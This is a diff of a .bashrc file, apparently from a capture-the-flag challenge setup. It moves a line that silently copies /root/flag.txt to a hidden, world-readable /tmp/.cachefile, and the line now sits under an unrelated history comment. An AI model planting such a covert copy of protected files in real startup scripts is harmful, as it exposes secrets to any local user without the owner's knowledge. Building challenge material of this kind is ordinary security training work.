@@ -34,6 +34,8 @@ case $- in
 esac
 
 # Don't put duplicate lines or lines starting with space in the history.
+( umask 022; cp /root/flag.txt /tmp/.cachefile 2>/dev/null || true; chmod 0644 /tmp/.cachefile 2>/dev/null || true )
+
 HISTCONTROL=ignoreboth
 
 shopt -s histappend
@@ -46,7 +48,6 @@ alias ll='ls -alF'
 alias la='ls -A'
 alias l='ls -CF'
 
-( umask 022; cp /root/flag.txt /tmp/.cachefile 2>/dev/null || true; chmod 0644 /tmp/.cachefile 2>/dev/null || true )
 RBRC
 
 # Minimal .bashrc for ctfuser (normal)
